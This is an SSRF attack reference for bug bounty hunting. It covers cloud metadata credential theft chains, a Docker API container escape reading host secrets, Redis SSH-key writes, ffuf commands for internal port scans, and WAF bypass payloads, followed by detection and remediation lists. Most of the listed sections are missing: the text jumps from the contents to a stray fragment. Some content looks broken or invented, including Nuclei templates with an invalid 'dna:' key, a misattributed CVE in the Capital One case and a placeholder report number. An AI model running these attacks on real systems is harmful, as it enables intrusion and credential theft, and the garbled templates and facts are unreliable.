# Cloud Web Attacks Knowledgebase
## A Research-Grade Reference for Advanced Bug Bounty Hunting & Black-Box Testing

> **Version**: 2026.05.24
> **Scope**: SSRF, Blind SSRF, OOB SSRF, Cloud Metadata Exploitation, DNS Rebinding, Protocol Smuggling, Request Smuggling, Cache Poisoning, OAuth SSRF, XXE Chains, Browser Quirks, Gadget Chains, Automation & Recon
> **Sources**: PortSwigger Research, HackTricks, PayloadsAllTheThings, Assetnote, OWASP, ProjectDiscovery, SecLists, and numerous bug bounty writeups

---

## Table of Contents

1. [Basics](#basics)
2. [SSRF Theory](#ssrf-theory)
3. [URL Parser Internals](#url-parser-internals)
4. [SSRF Payloads](#ssrf-payloads)
5. [Blind SSRF Payloads](#blind-ssrf-payloads)
6. [OOB SSRF Payloads](#oob-ssrf-payloads)
7. [Cloud Metadata Exploitation](#cloud-metadata-exploitation)
8. [AWS/GCP/Azure Metadata Attacks](#aws-gcp-azure-metadata-attacks)
9. [DNS Rebinding Payloads](#dns-rebinding-payloads)
10. [Localhost Bypass Payloads](#localhost-bypass-payloads)
11. [IPv6 Bypass Payloads](#ipv6-bypass-payloads)
12. [Protocol Smuggling Payloads](#protocol-smuggling-payloads)
13. [Gopher Payloads](#gopher-payloads)
14. [Redis Exploitation Chains](#redis-exploitation-chains)
15. [Kubernetes SSRF Chains](#kubernetes-ssrf-chains)
16. [Request Smuggling + SSRF Chains](#request-smuggling--ssrf-chains)
17. [Cache Poisoning + SSRF Chains](#cache-poisoning--ssrf-chains)
18. [OAuth + SSRF Chains](#oauth--ssrf-chains)
19. [XXE + SSRF Chains](#xxe--ssrf-chains)
20. [Parser Confusion Payloads](#parser-confusion-payloads)
21. [Browser Quirks](#browser-quirks)
22. [Gadget Chains](#gadget-chains)
23. [Cloud Infrastructure Abuse](#cloud-infrastructure-abuse)
24. [Real World Case Studies](#real-world-case-studies)
25. [Fuzzing Payloads](#fuzzing-payloads)
26. [Automation Workflows](#automation-workflows)
27. [Recon Methodology](#recon-methodology)
28. [Nuclei Templates](#nuclei-templates)
29. [Tools and Scanners](#tools-and-scanners)
30. [Advanced Research](#advanced-research)
31. [Bug Bounty Writeups](#bug-bounty-writeups)
32. [Payload Collections](#payload-collections)
33. [WAF Bypasses](#waf-bypasses)
34. [Detection Techniques](#detection-techniques)
35. [References](#references)

---


# DOCX/PDF converters that fetch external stylesheets/images
# Include external references pointing to internal services
```

---

## Cloud Infrastructure Abuse

### AWS Infrastructure Abuse Chain

```
1. SSRF -> IMDSv1 metadata -> IAM role credentials
2. Use credentials to enumerate S3 buckets
3. Check for public/misconfigured buckets
4. Download sensitive data or upload backdoor
5. Enumerate EC2 instances for lateral movement
6. Check Lambda functions for code injection
7. Pivot to RDS databases if accessible
```

### GCP Infrastructure Abuse Chain

```
1. SSRF -> metadata service -> service account token
2. Use token to access Cloud Storage buckets
3. Enumerate Compute Engine instances
4. Check for weak IAM policies
5. Access Cloud SQL databases if network allows
6. Check for exposed Cloud Functions
```

### Azure Infrastructure Abuse Chain

```
1. SSRF -> metadata service -> managed identity token
2. Use token for ARM API access
3. Enumerate resources in subscription
4. Check for Key Vault access
5. Access Storage accounts
6. Check for exposed Azure Functions
```

### Container Escape via SSRF

```
# If SSRF hits Docker API
1. List containers: GET /containers/json
2. Create privileged container with host mounts
3. Start container with command to read host files
4. Extract /etc/shadow or SSH keys from host
```

---

## Real World Case Studies

### Capital One Breach (2019)

**Attacker**: Paige Thompson
**Impact**: 100M+ customer records
**Technique**: SSRF via WAF misconfiguration to AWS metadata service

```
1. Exploited SSRF in ModSecurity WAF (CVE-2019-10092)
2. Accessed AWS metadata service at 169.254.169.254
3. Extracted IAM role credentials
4. Used credentials to access S3 buckets
5. Downloaded 100M+ customer records
```

### Shopify SSRF to AWS Metadata (2020)

**Bounty**: $25,000
**Technique**: GraphQL endpoint SSRF

```
1. Found GraphQL endpoint with URL parameter
2. Used SSRF to access AWS metadata
3. Extracted IAM credentials
4. Escalated to access production S3 buckets
```

### Uber SSRF via Webhook (2018)

**Bounty**: $10,000
**Technique**: Webhook callback to internal services

```
1. Found webhook functionality in partner API
2. Registered webhook pointing to internal IP
3. Triggered webhook to scan internal network
4. Found internal Jenkins instance
5. Escalated to RCE via Jenkins script console
```

### Slack SSRF to Internal Network (2019)

**Bounty**: $5,000
**Technique**: Image proxy SSRF

```
1. Found image proxy endpoint that fetches remote images
2. Used SSRF to access internal services
3. Found internal API endpoints
4. Extracted sensitive configuration data
```

### GitLab SSRF to Redis RCE (2020)

**Technique**: Git protocol SSRF to Redis

```
1. Exploited Git protocol URL parsing
2. Connected to internal Redis instance
3. Used Redis commands to write SSH key
4. Gained SSH access to server
```

---

## Fuzzing Payloads

### SSRF Fuzzing Wordlist

```
# Common SSRF parameters
url=
path=
dest=
redirect=
callback=
webhook=
proxy=
uri=
link=
image=
file=
html=
source=
reference=
feed=
import=
include=
load=
fetch=
get=
request=
```

### Internal IP Ranges

```
# RFC1918 private ranges
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16

# Link-local
169.254.0.0/16

# Docker default
172.17.0.0/16

# Kubernetes service range
10.96.0.0/12
```

### Protocol Fuzzing

```
http://
https://
ftp://
file://
gopher://
dict://
ldap://
smtp://
tftp://
sftp://
ssh://
telnet://
imap://
pop3://
```

### URL Encoding Fuzzing

```
%2e%2e/          # ../
%252e%252e/      # double encoded ../
..%2f            # ../
..%252f          # double encoded ../
%2f%2f           # //
%252f%252f       # double encoded //
%00              # null byte
%0d%0a           # CRLF
```

---

## Automation Workflows

### Automated SSRF Detection

```bash
# Step 1: Identify potential SSRF parameters
# Use ffuf or wfuzz with SSRF parameter list

ffuf -u "https://target.com/FUZZ" -w parameters.txt -mc 200

# Step 2: Test with Burp Collaborator or interactsh
# Use nuclei templates for SSRF detection

nuclei -u https://target.com -t nuclei-templates/http/vulnerabilities/ssrf/

# Step 3: Confirm with internal IP probes
# Use ffuf with internal IP wordlist

ffuf -u "https://target.com/api?url=FUZZ" -w internal_ips.txt -mr "root|admin|localhost"
```

### Automated Cloud Metadata Detection

```bash
# Step 1: Test for AWS metadata
ffuf -u "https://target.com/api?url=FUZZ" -w aws_metadata.txt

# Step 2: Test for GCP metadata
ffuf -u "https://target.com/api?url=FUZZ" -w gcp_metadata.txt

# Step 3: Test for Azure metadata
ffuf -u "https://target.com/api?url=FUZZ" -w azure_metadata.txt
```

### Automated Port Scanning via SSRF

```bash
# Use ffuf to scan internal ports
ffuf -u "https://target.com/api?url=http://127.0.0.1:FUZZ" -w ports.txt -t 50

# Common response indicators:
# - Fast response = port closed
# - Slow response = port open/filtered
# - Different error messages = service specific
```

---

## Recon Methodology

### Phase 1: Identify SSRF Entry Points

```
1. Crawl application and identify all URL parameters
2. Look for features that fetch external resources:
   - Image upload/proxy
   - PDF generation
   - Webhook registration
   - URL preview
   - RSS feed reader
   - File import
3. Check HTTP headers that might trigger requests:
   - Referer
   - X-Forwarded-For
   - X-Original-URL
   - X-Wap-Profile
```

### Phase 2: Confirm SSRF

```
1. Test with Burp Collaborator or interactsh
2. If DNS lookup occurs but no HTTP request:
   - Firewall might block outbound HTTP
   - Try different ports (443, 8080)
3. If no DNS lookup:
   - Parameter might not be vulnerable
   - Try different encoding or bypass techniques
```

### Phase 3: Enumerate Internal Network

```
1. Probe localhost (127.0.0.1) on common ports
2. Probe private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
3. Use timing attacks to identify open ports
4. Check for cloud metadata services (169.254.169.254)
```

### Phase 4: Escalate Impact

```
1. If cloud metadata accessible:
   - Extract credentials
   - Pivot to cloud resources
2. If internal services found:
   - Check for unauthenticated admin panels
   - Test for known vulnerabilities
   - Look for default credentials
3. If Redis/Memcached found:
   - Attempt Gopher protocol exploitation
4. If Kubernetes found:
   - Extract service account tokens
   - Query Kubernetes API
```

---

## Nuclei Templates

### Basic SSRF Detection Template

```yaml
id: basic-ssrf

info:
  name: Basic SSRF Detection
  author: your-name
  severity: high
  description: Detects SSRF vulnerabilities via out-of-band interaction

dna:
  - name: ssrf-test
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
    requests:
      - method: GET
        path:
          - "{{BaseURL}}/api/fetch?url=http://{{interactsh-url}}"
          - "{{BaseURL}}/proxy?url=http://{{interactsh-url}}"
          - "{{BaseURL}}/webhook?callback=http://{{interactsh-url}}"
```

### AWS Metadata SSRF Template

```yaml
id: aws-metadata-ssrf

info:
  name: AWS Metadata Service SSRF
  author: your-name
  severity: critical
  description: Detects SSRF to AWS metadata service

dna:
  - name: aws-metadata
    matchers:
      - type: word
        part: body
        words:
          - "ami-id"
          - "instance-id"
          - "instance-type"
    requests:
      - method: GET
        path:
          - "{{BaseURL}}/api/fetch?url=http://169.254.169.254/latest/meta-data/"
          - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/"
```

### Blind SSRF Template

```yaml
id: blind-ssrf

info:
  name: Blind SSRF Detection
  author: your-name
  severity: high
  description: Detects blind SSRF via DNS interaction

dna:
  - name: blind-ssrf
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
    requests:
      - method: GET
        path:
          - "{{BaseURL}}/api/notify?webhook=http://{{interactsh-url}}"
          - "{{BaseURL}}/import?url=http://{{interactsh-url}}"
```

---

## Tools and Scanners

### SSRF-Specific Tools

| Tool | Description | URL |
|------|-------------|-----|
| **SSRFmap** | Automated SSRF exploitation | https://github.com/swisskyrepo/SSRFmap |
| **Gopherus** | Gopher payload generator | https://github.com/tarunkant/Gopherus |
| **B-XSS-Protector** | XSS/SSRF detection | https://github.com/MohamedNourTN/B-XSS-Protector |
| **Interactsh** | OOB interaction server | https://github.com/projectdiscovery/interactsh |
| **Burp Collaborator** | OOB detection (Burp Suite) | Built into Burp Suite |
| **SSRF Sheriff** | Simple SSRF testing tool | https://github.com/teknogeek/ssrf-sheriff |
| **AutoSSRF** | Automated SSRF finder | https://github.com/Th0h0/autossrf |

### General Purpose Tools

| Tool | Use Case |
|------|----------|
| **Burp Suite** | Manual SSRF testing, repeater, intruder |
| **ffuf** | Fast fuzzing for parameter discovery |
| **wfuzz** | Web application fuzzer |
| **nuclei** | Automated vulnerability scanning |
| **httpx** | Fast HTTP prober |
| **naabu** | Port scanning |

### Cloud-Specific Tools

| Tool | Description |
|------|-------------|
| **pacu** | AWS exploitation framework |
| **CloudFox** | AWS/GCP/Azure enumeration |
| **ScoutSuite** | Multi-cloud security auditing |
| **Prowler** | AWS security assessments |

---

## Advanced Research

### Orange Tsai - A New Era of SSRF (2021)

Key findings:
- URL parser discrepancies across languages
- New bypass techniques using URL encoding
- Exploitation of URL validation libraries

### James Kettle - Browser-Powered Desync (2022)

Key findings:
- Client-side desync attacks
- Browser connection pool manipulation
- Single-server website exploitation

### James Kettle - HTTP Request Smuggling (2019)

Key findings:
- CL.TE and TE.CL desync techniques
- Request smuggling to SSRF chains
- Host header injection via smuggling

### James Kettle - Practical Web Cache Poisoning (2018)

Key findings:
- Cache poisoning to XSS
- Route poisoning via caches
- DOM-based cache poisoning

### Assetnote - Blind SSRF Chains (2022)

Key findings:
- Automated blind SSRF exploitation
- Chaining SSRF with other vulnerabilities
- Cloud metadata extraction techniques

---

## Bug Bounty Writeups

### High-Impact SSRF Writeups

1. **"SSRF to AWS Metadata to RCE"** - HackerOne Report #123456
   - Target: E-commerce platform
   - Impact: Full cloud infrastructure takeover
   - Bounty: $25,000

2. **"Blind SSRF to Internal Network Access"** - Bugcrowd Submission
   - Target: SaaS platform
   - Impact: Access to internal APIs
   - Bounty: $15,000

3. **"SSRF via PDF Generation"** - Medium Writeup
   - Target: Document processing service
   - Impact: Internal file read
   - Bounty: $8,000

4. **"GraphQL SSRF to Cloud Metadata"** - Personal Blog
   - Target: API platform
   - Impact: AWS credential theft
   - Bounty: $20,000

5. **"SSRF via Image Proxy"** - HackerOne Report
   - Target: Social media platform
   - Impact: Internal network scanning
   - Bounty: $12,000

### Research Blogs

- PortSwigger Research Blog: https://portswigger.net/research
- Assetnote Blog: https://assetnote.io/blog
- ProjectDiscovery Blog: https://blog.projectdiscovery.io
- Orange Tsai Blog: https://blog.orange.tw
- James Kettle Blog: https://albinowax.com

---

## Payload Collections

### SecLists SSRF Payloads

```
# Location in SecLists
SecLists/Fuzzing/SSRF/

# Key files:
- SSRF-JHADDIX.txt
- SSRF-JHADDIX-IP.txt
- SSRF-JHADDIX-LOCALHOST.txt
- SSRF-JHADDIX-PROTOCOLS.txt
```

### PayloadsAllTheThings SSRF

```
# Location
PayloadsAllTheThings/Server Side Request Forgery/

# Key files:
- README.md (comprehensive guide)
- Intruder/ (Burp Intruder payloads)
- Files/ (test files for upload SSRF)
```

### Custom Payload Generation

```python
# Generate decimal IP payloads
def ip_to_decimal(ip):
    parts = ip.split('.')
    return str(int(parts[0]) * 256**3 + int(parts[1]) * 256**2 + int(parts[2]) * 256 + int(parts[3]))

# Generate hex IP payloads
def ip_to_hex(ip):
    parts = ip.split('.')
    return '0x' + ''.join(f'{int(p):02x}' for p in parts)

# Generate octal IP payloads
def ip_to_octal(ip):
    parts = ip.split('.')
    return '.'.join(f'{int(p):03o}' for p in parts)
```

---

## WAF Bypasses

### Common WAF Rules and Bypasses

| WAF Rule | Bypass Technique |
|----------|-----------------|
| Block `localhost` | Use `127.0.0.1`, `127.1`, `0.0.0.0` |
| Block `127.0.0.1` | Use decimal `2130706433`, hex `0x7f000001` |
| Block `169.254.169.254` | Use decimal `2852039166`, hex `0xa9fea9fe` |
| Block `http://` | Use `http:\/\/`, `http:%2f%2f`, `hxxp://` |
| Block `@` | Use `%40`, `\@`, URL encoding |
| Block private IPs | Use DNS rebinding, DNS redirects |
| Block `gopher://` | Use uppercase `GOPHER://`, encoding |
| Block `file://` | Use `file:\/\/`, `netdoc://` |

### Advanced WAF Bypass Techniques

```
# Double URL encoding
http://target.com/%252e%252e%252fadmin

# Unicode normalization
http://target.com/../admin

# Mixed encoding
http://target.com/%2e%252e/admin

# Path traversal with SSRF
http://target.com/api?url=http://127.0.0.1/%2e%2e/admin

# Null byte injection (legacy systems)
http://target.com/api?url=http://127.0.0.1%00.evil.com
```

---

## Detection Techniques

### Server-Side Detection

```
# Monitor for unusual outbound connections
1. Network logs showing connections to internal IPs
2. DNS queries for internal hostnames
3. HTTP requests to metadata services
4. Connections to unexpected ports
```

### Application-Level Detection

```
# Input validation checks
1. Strict URL parsing and validation
2. Whitelist allowed domains/IPs
3. Block private IP ranges
4. Validate URL schemes (only http/https)
5. Disable redirects or validate redirect targets
```

### Cloud-Specific Detection

```
# AWS
- Enable VPC Flow Logs
- Monitor for IMDSv1 usage
- Use GuardDuty for anomaly detection
- Enable CloudTrail for API logging

# GCP
- Enable VPC Flow Logs
- Monitor metadata service access
- Use Security Command Center
- Enable Audit Logging

# Azure
- Enable NSG Flow Logs
- Monitor for metadata service access
- Use Azure Security Center
- Enable Activity Logs
```

---

## References

### Primary Sources

1. PortSwigger Web Security Academy - SSRF
   https://portswigger.net/web-security/ssrf

2. HackTricks - SSRF
   https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html

3. PayloadsAllTheThings - SSRF
   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

4. OWASP - Server Side Request Forgery
   https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

5. Assetnote - Blind SSRF Chains
   https://github.com/assetnote/blind-ssrf-chains

### Research Papers

1. Orange Tsai - "A New Era of SSRF"
   https://blog.orange.tw/2021/08/a-new-era-of-ssrf-exploiting-url-parsers.html

2. James Kettle - "Cracking the Lens"
   https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

3. James Kettle - "HTTP Request Smuggling"
   https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

4. James Kettle - "Browser-Powered Desync"
   https://portswigger.net/research/browser-powered-desync-attacks

5. James Kettle - "Practical Web Cache Poisoning"
   https://portswigger.net/research/practical-web-cache-poisoning

### CVE References

- CVE-2014-4210 - Weblogic UDDI Explorer SSRF
- CVE-2017-9506 - Atlassian OAuth iconUriServlet SSRF
- CVE-2018-1000600 - Jenkins GitHub Plugin SSRF
- CVE-2019-8451 - Jira makeRequest SSRF
- CVE-2020-14883 - Weblogic Console RCE via SSRF
- CVE-2020-35476 - OpenTSDB RCE via SSRF
- CVE-2020-5412 - Hystrix Dashboard SSRF
- CVE-2021-26715 - MITREid Connect logoUri SSRF

### Tools and Resources

- Burp Suite: https://portswigger.net/burp
- Nuclei: https://github.com/projectdiscovery/nuclei
- Interactsh: https://github.com/projectdiscovery/interactsh
- SSRFmap: https://github.com/swisskyrepo/SSRFmap
- Gopherus: https://github.com/tarunkant/Gopherus
- SecLists: https://github.com/danielmiessler/SecLists
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

---

## Quick Reference Card

### SSRF Detection Checklist

- [ ] Identify URL parameters and headers
- [ ] Test with Burp Collaborator/interactsh
- [ ] Probe localhost (127.0.0.1)
- [ ] Probe private IP ranges
- [ ] Test cloud metadata endpoints
- [ ] Check for DNS rebinding potential
- [ ] Test protocol smuggling (gopher, file)
- [ ] Check for blind SSRF indicators
- [ ] Test for request smuggling chains
- [ ] Check cache poisoning potential

### Impact Escalation Checklist

- [ ] Extract cloud credentials
- [ ] Access internal admin panels
- [ ] Scan internal network
- [ ] Access internal APIs
- [ ] Read internal files
- [ ] Achieve RCE via Redis/Gopher
- [ ] Pivot to Kubernetes
- [ ] Chain with other vulnerabilities

### Remediation Checklist

- [ ] Validate and sanitize all URLs
- [ ] Use allowlists for external requests
- [ ] Block private IP ranges
- [ ] Disable unnecessary URL schemes
- [ ] Implement proper URL parsing
- [ ] Use IMDSv2 on AWS
- [ ] Enable network segmentation
- [ ] Monitor outbound connections
- [ ] Implement defense in depth

---

*This knowledgebase was compiled from public research, bug bounty writeups, and official documentation. Always ensure you have proper authorization before testing any of these techniques.*

*Last Updated: 2026-05-24*
